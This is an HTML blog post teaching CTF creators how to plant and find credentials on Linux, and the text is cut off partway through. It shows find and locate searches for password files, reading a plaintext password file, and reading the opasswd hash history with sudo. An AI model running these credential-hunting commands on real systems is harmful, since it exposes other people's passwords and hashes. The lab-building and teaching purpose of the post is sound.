<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Linux Privilege Escalation - Credential Hunting  for CTF Creators - pwnlog</title><meta name="Description" content="IT Security"><meta property="og:url" content="//localhost:1313/linux-privesc-credential-hunting/">
  <meta property="og:site_name" content="pwnlog">
  <meta property="og:title" content="Linux Privilege Escalation - Credential Hunting  for CTF Creators">
  <meta property="og:description" content="Credentials are everywhere!">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-12-28T11:32:00+08:00">
    <meta property="article:modified_time" content="2021-12-28T11:32:00+08:00">
    <meta property="article:tag" content="Credential Hunting">
    <meta property="article:tag" content="Plaintext">
    <meta property="article:tag" content="Cleartext">
    <meta property="article:tag" content="Smtp">
    <meta property="article:tag" content="Postfix">
    <meta property="article:tag" content="Opasswd">
    <meta property="og:image" content="//localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="//localhost:1313/logo.png">
  <meta name="twitter:title" content="Linux Privilege Escalation - Credential Hunting  for CTF Creators">
  <meta name="twitter:description" content="Credentials are everywhere!">
<meta name="application-name" content="pwnlog">
<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/linux-privesc-credential-hunting/" /><link rel="next" href="//localhost:1313/linux-privesc-capabilities/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Linux Privilege Escalation - Credential Hunting  for CTF Creators",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "\/\/localhost:1313\/linux-privesc-credential-hunting\/"
        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "credential hunting, plaintext, cleartext, smtp, postfix, opasswd, mysql, configuration files, pcapng, john, history, sshpass, telnet, netcat, swaks, scp","wordcount":  5836 ,
        "url": "\/\/localhost:1313\/linux-privesc-credential-hunting\/","datePublished": "2021-12-28T11:32:00+08:00","dateModified": "2021-12-28T11:32:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
                "@type": "Person",
                "name": "pwnlog"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Privilege Escalation - Credential Hunting  for CTF Creators</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Privilege Escalation</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-28">2021-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;5836 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;28 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#credential-hunting">Credential Hunting</a></li>
    <li><a href="#privilege-escalation-via-sensitive-files">Privilege Escalation via Sensitive Files</a>
      <ul>
        <li>
          <ul>
            <li><a href="#password-filename-scenario">Password Filename Scenario</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-old-passwords">Privilege Escalation via Old Passwords</a></li>
    <li><a href="#privilege-escalation-via-plain-text-files-containing-passwords">Privilege Escalation via Plain Text Files Containing Passwords</a>
      <ul>
        <li>
          <ul>
            <li><a href="#plain-text-file-scenario">Plain Text File Scenario</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-network-packets">Privilege Escalation via Network Packets</a>
      <ul>
        <li>
          <ul>
            <li><a href="#wireshark-capture-scenario-ftp">Wireshark Capture Scenario (FTP)</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-images">Privilege Escalation via Images</a>
      <ul>
        <li>
          <ul>
            <li><a href="#screenshot-scenario">Screenshot Scenario</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-history-files">Privilege Escalation via History Files</a>
      <ul>
        <li>
          <ul>
            <li><a href="#sshpass-scenario">sshpass Scenario</a></li>
          </ul>
        </li>
        <li><a href="#emails">Emails</a>
          <ul>
            <li><a href="#smtp-postfix-scenario">SMTP Postfix Scenario</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-databases">Privilege Escalation via Databases</a>
      <ul>
        <li>
          <ul>
            <li><a href="#mariadb-scenario">MariaDB Scenario:</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-compressed-files--archives">Privilege Escalation via Compressed Files / Archives</a>
      <ul>
        <li>
          <ul>
            <li><a href="#compressed-file-scenario">Compressed File Scenario</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-buffer-files">Privilege Escalation via Buffer Files</a>
      <ul>
        <li>
          <ul>
            <li><a href="#nano-scenario">Nano Scenario</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#privilege-escalation-via-backup-files">Privilege Escalation via Backup Files</a>
      <ul>
        <li>
          <ul>
            <li><a href="#sensitive-file-etcshadow-backup-scenario">Sensitive File /etc/shadow Backup Scenario</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="credential-hunting">Credential Hunting</h1>
<p>Credential hunting is the practice of finding credentials in a system. These can either be encrypted, encoded, or in plain text. Some programs may store credentials in an encrypted format while others do not.</p>
<h1 id="privilege-escalation-via-sensitive-files">Privilege Escalation via Sensitive Files</h1>
<p>In Linux, many files may contain passwords:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ locate password <span class="p">|</span> less           
</span></span><span class="line"><span class="cl">/boot/grub/i386-pc/legacy_password_test.mod
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="password-filename-scenario">Password Filename Scenario</h3>
<p>Startup by installing locate:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install mlocate
</span></span></code></pre></td></tr></table>
</div>
</div><p>From the adversary&rsquo;s perspective, we can try to locate all the files that have in their name <code>password</code> as part of the filename:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ locate password <span class="p">|</span> less           
</span></span><span class="line"><span class="cl">/boot/grub/i386-pc/legacy_password_test.mod
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we could attempt to list the permissions of each of these files with:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ locate password  <span class="p">|</span> xargs ls -l
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user  user     <span class="m">47</span> Jan  <span class="m">5</span> 17:00 /home/user/Desktop/password.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>Alternatively, we could just use the find command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / -iname <span class="s2">&#34;*password*&#34;</span> -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</span></span></code></pre></td></tr></table>
</div>
</div><p>We could filter the output more by using the <code>-readable</code> option to find readable files by our current user.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find / -iname <span class="s2">&#34;*password*&#34;</span> -readable -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</span></span></code></pre></td></tr></table>
</div>
</div><p>There are some directories in which I&rsquo;m not interested so we can also filter directories that we&rsquo;re not interested in:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ find / -iname <span class="s2">&#34;*password*&#34;</span> -readable -exec ls -l <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null <span class="p">|</span> grep -Ev <span class="s1">&#39;snap|boot|/share|/lib&#39;</span>
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> user user <span class="m">47</span> Jan  <span class="m">5</span> 17:00 /home/user/Desktop/password.txt
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first line from the output above is the only one that seems interesting to us:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /home/user/Desktop/password.txt
</span></span><span class="line"><span class="cl">Passwords:
</span></span><span class="line"><span class="cl">	The user password is: pass321
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, in a real-world machine (not common) or a CTF machine, we might find an interesting configuration file or a custom file that is not ordinary and might contain credentials.</p>
<h1 id="privilege-escalation-via-old-passwords">Privilege Escalation via Old Passwords</h1>
<p>The <code>/etc/security/opasswd</code> file is used also by <code>pam_cracklib</code> to keep the history of old passwords so that the user will not reuse them. This file contains user password hashes.</p>
<p>I&rsquo;m going to install the libraries first:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo apt-cache search pam_cracklib
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> user: 
</span></span><span class="line"><span class="cl">libpam-cracklib - PAM module to <span class="nb">enable</span> cracklib support
</span></span><span class="line"><span class="cl">libpam-pwquality - PAM module to check password strength
</span></span><span class="line"><span class="cl">user@pwn:~$ sudo apt install libpam-cracklib libpam-pwquality
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now let&rsquo;s check if the shared objects files were created:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ find / -name <span class="s1">&#39;pam_cracklib.so&#39;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/security/pam_cracklib.so
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user@pwn:~$ find / -name <span class="s1">&#39;pam_unix.so&#39;</span> 2&gt;/dev/null <span class="p">|</span> grep -v snap
</span></span><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/security/pam_unix.so
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>opasswd</code> shall be treated as the <code>/etc/shadow</code> file because it will contain user password hashes, therefore the configuration is the following by default:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ ls -l /etc/security/opasswd
</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root <span class="m">0</span> Aug <span class="m">19</span> 06:29 /etc/security/opasswd
</span></span></code></pre></td></tr></table>
</div>
</div><p>Once we&rsquo;ve got the <code>opasswd</code> file set up, we can enable password history checking by adding the option <code>&quot;remember=&lt;x&gt;&quot;</code> to the <code>pam_unix</code> configuration line in the <code>/etc/pam.d/common-password</code> file. This enables the <code>pam_cracklib</code> module:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /etc/pam.d/common-password
</span></span><span class="line"><span class="cl">&lt;SNIP&gt;
</span></span><span class="line"><span class="cl">password required pam_cracklib.so <span class="nv">retry</span><span class="o">=</span><span class="m">3</span> <span class="nv">minlen</span><span class="o">=</span><span class="m">12</span> <span class="nv">difok</span><span class="o">=</span><span class="m">4</span>
</span></span><span class="line"><span class="cl">password required pam_unix.so md5 <span class="nv">remember</span><span class="o">=</span><span class="m">12</span> use_authtok
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: Noticed how all the instructions before the last two lines are commented. I commented all of them to avoid conflict.</p>
</blockquote>
<blockquote>
<p>Source: <a href="https://deer-run.com/users/hal/sysadmin/pam_cracklib.html" target="_blank" rel="noopener noreffer ">https://deer-run.com/users/hal/sysadmin/pam_cracklib.html</a></p>
</blockquote>
<p>The number of old passwords we want to preserve for a user is the value of the &ldquo;remember&rdquo; option. Because there is an internal limit of 400 prior passwords, all values greater than 400 are identical to 400. Before we complain about this limit, keep in mind that 400 previous passwords represent nearly 30 years of password history, even if your site requires users to change passwords every 30 days it will stay working for 30 years.</p>
<p>Once we&rsquo;ve enabled password history, the <code>opasswd</code> file starts filling up with user entries that look like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user:1000:&lt;n&gt;:&lt;hash1&gt;,&lt;hash2&gt;,...,&lt;hashn&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first two fields are the username and user ID. The <code>&lt;n&gt;</code> in the third field represents the number of old passwords currently being stored for the user&ndash;this value is incremented by one every time a new hash is added to the user&rsquo;s password history until <code>&lt;n&gt;</code> ultimately equals the value of the &ldquo;remember&rdquo; parameter set on the <code>pam_unix</code> configuration line. The <code>&lt;hash1&gt;,&lt;hash2&gt;,...,&lt;hashn</code>&gt;` are the MD5 password hashes for the user&rsquo;s old passwords.</p>
<p>Let&rsquo;s try to change the user password to <code>p@$$w0rd321!</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo passwd user
</span></span><span class="line"><span class="cl">New password: 
</span></span><span class="line"><span class="cl">Retype new password: 
</span></span><span class="line"><span class="cl">BAD PASSWORD: is too simple
</span></span><span class="line"><span class="cl">Retype new password: 
</span></span><span class="line"><span class="cl">Sorry, passwords <span class="k">do</span> not match.
</span></span><span class="line"><span class="cl">New password: <span class="c1"># p@$$w0rd321!</span>
</span></span><span class="line"><span class="cl">Retype new password: <span class="c1"># p@$$w0rd321!</span>
</span></span><span class="line"><span class="cl">passwd: password updated successfully
</span></span><span class="line"><span class="cl">user@pwn:~$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on the output above we can see that a weak password was detected. Let&rsquo;s try to change the password to something similar to the one that we just applied:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ passwd user
</span></span><span class="line"><span class="cl">Changing password <span class="k">for</span> user.
</span></span><span class="line"><span class="cl">Current password: 
</span></span><span class="line"><span class="cl">Changing password <span class="k">for</span> user.
</span></span><span class="line"><span class="cl">New password: <span class="c1"># p@$$w0rd321!2</span>
</span></span><span class="line"><span class="cl">Retype new password: <span class="c1"># p@$$w0rd321!2</span>
</span></span><span class="line"><span class="cl">BAD PASSWORD: is too similar to the old one
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we see the output above, we can see that the password is similar to the old one and therefore we need to use another password. If we try to use an old one:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ passwd user
</span></span><span class="line"><span class="cl">Changing password <span class="k">for</span> user.
</span></span><span class="line"><span class="cl">Current password: 
</span></span><span class="line"><span class="cl">Changing password <span class="k">for</span> user.
</span></span><span class="line"><span class="cl">New password: <span class="c1"># p@$$w0rd321!</span>
</span></span><span class="line"><span class="cl">BAD PASSWORD: The password is the same as the old one
</span></span><span class="line"><span class="cl">New password: <span class="c1"># p@$$w0rdarlll!</span>
</span></span><span class="line"><span class="cl">Retype new password: <span class="c1"># p@$$w0rdarlll!</span>
</span></span><span class="line"><span class="cl">passwd: password updated successfully
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can&rsquo;t use an old password based on the output above. Let&rsquo;s change the users&rsquo; password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ passwd user
</span></span><span class="line"><span class="cl">Changing password <span class="k">for</span> user.
</span></span><span class="line"><span class="cl">Current password: 
</span></span><span class="line"><span class="cl">New password: <span class="c1"># p@$$ward331!</span>
</span></span><span class="line"><span class="cl">Retype new password: <span class="c1"># p@$$ward331!</span>
</span></span><span class="line"><span class="cl">passwd: password updated successfully
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is an ideal way to change a password by avoiding using weak passwords, similar passwords to previous passwords and by not using old passwords.</p>
<p>Now let&rsquo;s try to read the <code>/etc/security/opasswd</code> file as root:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo cat /etc/security/opasswd
</span></span><span class="line"><span class="cl">user:1000:1:<span class="nv">$1$xxxxxxxxxxxxxxxxxxxxxxxx</span>.
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we had root UID using a SUID bit program that we can abuse then we could try to read this file, otherwise, if we had the root GID using <code>SGID</code> bit program that we can abuse we could also try to read this file. Alternatively, if we had a sudo command that we can perform a shell escape sequence then we can also try to read this file. Lastly, if the file was readable by other users and groups we could read this file as well. Anyways let&rsquo;s try to change the password to something that exists in the <code>rockyou.txt</code> wordlist.</p>
<p>In our adversary host, let&rsquo;s find a password that&rsquo;s 12 characters long in the <code>rockyou.txt</code> wordlist:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">grep -E <span class="s2">&#34;^[A-Za-z]{12}</span>$<span class="s2">&#34;</span> /usr/share/wordlists/rockyou.txt <span class="p">|</span> less
</span></span></code></pre></td></tr></table>
</div>
</div><p>I&rsquo;m going to use <code>p@$$w0rd!</code> as the new password:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ passwd user
</span></span><span class="line"><span class="cl">Changing password <span class="k">for</span> user.
</span></span><span class="line"><span class="cl">Current password: <span class="c1"># p@$$ward331!</span>
</span></span><span class="line"><span class="cl">New password: <span class="c1"># p@$$w0rd!</span>
</span></span><span class="line"><span class="cl">Retype new password: <span class="c1"># p@$$w0rd!</span>
</span></span><span class="line"><span class="cl">passwd: password updated successfully
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we read the <code>/etc/security/opasswd</code> again:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo cat /etc/security/opasswd
</span></span><span class="line"><span class="cl">user:1000:2:<span class="nv">$1$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see that the third column now has incremented to the number (<code>2</code>) and that there are two password hashes separated by a comma (<code>,</code>).  These hashes belong to <code>p@$$w0rdarlll!</code> and <code>p@$$ward331!</code> respectively. Now I want the password hash of the password <code>p@$$w0rd!</code> therefore, we&rsquo;ll change the password once again. This time I will use the password <code>p@$$w321</code> which is in the <code>rockyou.txt</code> dictionary:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ passwd user
</span></span><span class="line"><span class="cl">Changing password <span class="k">for</span> user.
</span></span><span class="line"><span class="cl">Current password: <span class="c1"># p@$$w0rd!</span>
</span></span><span class="line"><span class="cl">New password: <span class="c1"># p@$$w321</span>
</span></span><span class="line"><span class="cl">Retype new password: <span class="c1"># p@$$w321</span>
</span></span><span class="line"><span class="cl">passwd: password updated successfully
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we read <code>/etc/security/opasswd</code> file now:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
